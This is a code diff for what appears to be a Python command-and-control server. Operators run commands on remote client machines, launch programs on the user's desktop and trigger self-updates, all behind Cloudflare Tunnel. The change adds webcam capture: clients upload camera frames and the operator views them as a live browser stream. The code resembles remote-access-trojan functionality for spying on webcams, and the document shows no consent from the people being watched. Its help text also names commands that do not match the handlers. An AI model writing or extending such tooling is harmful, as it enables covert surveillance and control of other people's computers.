@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "2.9.1"
+VERSION = "3.0.0"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -18,12 +18,15 @@ import queue
 import signal
 import os
 import readline  # enables arrow-key history in input()
+import io
 
 # Per-client state
 clients = {}
 lock = threading.Lock()
 active_client = None
 result_queue = queue.Queue(maxsize=500)  # (client_id, kind, body)
+camera_frames = {}  # client_id -> latest frame data
+camera_clients = {}  # client_id -> set of http response objects
 
 
 def get_or_create_client(client_id):
@@ -151,6 +154,32 @@ class Handler(BaseHTTPRequestHandler):
                     client["last_checkin"] = time.time()
             self._respond(200, b"pong")
 
+        elif path == "/camera":
+            # Serve MJPEG stream for camera viewing
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            with lock:
+                client = get_or_create_client(client_id)
+                client["last_checkin"] = time.time()
+            self.send_response(200)
+            self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
+            self.send_header("Cache-Control", "no-cache")
+            self.send_header("Connection", "close")
+            self.end_headers()
+            # Register this viewer and keep connection alive
+            if client_id not in camera_clients:
+                camera_clients[client_id] = set()
+            camera_clients[client_id].add(self)
+            try:
+                # Block until client disconnects or camera stops
+                while True:
+                    time.sleep(1)
+            except:
+                pass
+            finally:
+                camera_clients.get(client_id, set()).discard(self)
+
         else:
             self._respond(404)
 
@@ -181,14 +210,20 @@ class Handler(BaseHTTPRequestHandler):
                     client["command_running"] = False
                     client["interactive"] = False
                     client["pending_stdin"] = []
-            # Never drop /result — evict old stream chunks if queue is full
+            # Never drop /result — evict stream chunks if queue is full
             while True:
                 try:
                     result_queue.put((client_id, "result", body), timeout=0.1)
                     break
                 except queue.Full:
                     try:
-                        result_queue.get_nowait()  # evict oldest (likely a stream chunk)
+                        evicted = result_queue.get_nowait()
+                        # If we accidentally grabbed a result, put it back
+                        if evicted[1] == "result":
+                            try:
+                                result_queue.put_nowait(evicted)
+                            except queue.Full:
+                                pass  # truly full, drop the stream chunk
                     except queue.Empty:
                         break
             self._respond(200, b"ok")
@@ -199,6 +234,35 @@ class Handler(BaseHTTPRequestHandler):
                 with lock:
                     client = get_or_create_client(client_id)
                     client["interactive"] = body.strip().lower() == "true"
+            self._respond(200, b"ok")
+
+        elif path == "/camera_frame":
+            # Endpoint for clients to upload camera frames (raw JPEG bytes)
+            if not client_id:
+                self._respond(400, b"missing id")
+                return
+            with lock:
+                client = get_or_create_client(client_id)
+                client["last_checkin"] = time.time()
+            # Read raw bytes (not decoded text)
+            raw_body = body.encode("latin-1")  # reverse the decode(errors=replace)
+            camera_frames[client_id] = raw_body
+            # Broadcast to all connected viewers
+            dead_viewers = set()
+            for viewer in camera_clients.get(client_id, set()).copy():
+                try:
+                    viewer.wfile.write(b"--frame\r\n")
+                    viewer.wfile.write(b"Content-Type: image/jpeg\r\n")
+                    viewer.wfile.write(f"Content-Length: {len(raw_body)}\r\n".encode())
+                    viewer.wfile.write(b"\r\n")
+                    viewer.wfile.write(raw_body)
+                    viewer.wfile.write(b"\r\n")
+                    viewer.wfile.flush()
+                except:
+                    dead_viewers.add(viewer)
+            # Remove dead viewers from the actual set
+            for v in dead_viewers:
+                camera_clients.get(client_id, set()).discard(v)
             self._respond(200, b"ok")
 
         else:
@@ -398,27 +462,33 @@ def input_loop():
             print("    cancel            Abort running command on active client")
             print("    Ctrl+\\            Same as cancel (keyboard shortcut)")
             print()
-            print("  CLIENT COMMANDS (sent to remote machine):")
-            print("    version              Show client version, host, PID")
-            print("    update               Force self-update from GitHub now")
-            print("    gui:<cmd>            Launch GUI on user's desktop")
-            print("    notimeout:<cmd>      Run without 300s timeout")
+            print("  REMOTE COMMANDS (sent to client):")
+            print("    stream            Start webcam streaming on client")
+            print("    stopstream        Stop webcam streaming")
+            print("    version           Show client version, host, PID")
+            print("    update            Force self-update from GitHub now")
+            print("    gui:<cmd>         Launch GUI on user's desktop")
+            print("    notimeout:<cmd>   Run without 300s timeout")
             print()
             print("  EXAMPLES:")
-            print("    gui:explorer .       Open Explorer on remote desktop")
-            print("    gui:notepad          Open Notepad visibly")
-            print("    gui:code .           Open VS Code in current dir")
+            print("    stream            Start webcam → view in browser")
+            print("    stopstream        Stop webcam")
+            print("    gui:explorer .    Open Explorer on remote desktop")
+            print("    gui:code .        Open VS Code in current dir")
             print("    notimeout:ping -t 8.8.8.8   Run forever until cancel")
             print()
             print("  SHORTCUTS (auto-routes to gui):")
-            print("    camera               Open Camera app")
-            print("    recorder             Open Sound Recorder")
-            print("    settings             Open Windows Settings")
-            print("    calc                 Open Calculator")
+            print("    camera_app        Open Windows Camera app")
+            print("    recorder          Open Sound Recorder")
+            print("    settings          Open Windows Settings")
+            print("    calc              Open Calculator")
+            print()
+            print("  WEBCAM VIEWING:")
+            print("    After 'camera', open: http://localhost:4444/camera?id=<client_id>")
             print()
             print("  SERVER:")
-            print("    exit               Shut down THIS server (not client)")
-            print("    help               Show this message")
+            print("    exit              Shut down THIS server (not client)")
+            print("    help              Show this message")
             print()
             print("  ⚠  'exit' shuts the SERVER. Use 'kill <id>' to stop a client.")
             continue
@@ -426,6 +496,43 @@ def input_loop():
         if stripped == "exit":
             print("[*] Shutting down server.")
             os._exit(0)
+
+        if stripped == "camera":
+            # Start camera streaming on active client
+            with lock:
+                if not active_client:
+                    print("[*] No active client. Use 'use <id>' to select one.")
+                    continue
+                client = clients.get(active_client)
+                if not client:
+                    print(f"[!] Client {active_client} not found.")
+                    continue
+                if client["command_running"]:
+                    print(f"[!] Command already running on {active_client}. Cancel first.")
+                    continue
+                client["pending_command"] = "camera"
+                client["command_running"] = True
+            print(f"[*] Camera stream started on {active_client}")
+            print(f"[*] View at: http://localhost:4444/camera?id={active_client}")
+            print("[*] Waiting for client to connect...")
+            continue
+
+        if stripped == "stopcamera":
+            # Stop camera streaming on active client
+            with lock:
+                if not active_client:
+                    print("[*] No active client. Use 'use <id>' to select one.")
+                    continue
+                client = clients.get(active_client)
+                if not client:
+                    print(f"[!] Client {active_client} not found.")
+                    continue
+                if client["command_running"]:
+                    client["pending_signal"] = "cancel"
+                    client["pending_command"] = None
+                    client["pending_stdin"] = []
+            print(f"[*] Camera stream stopped on {active_client}")
+            continue
 
         # --- Remote command or stdin ---
         with lock:
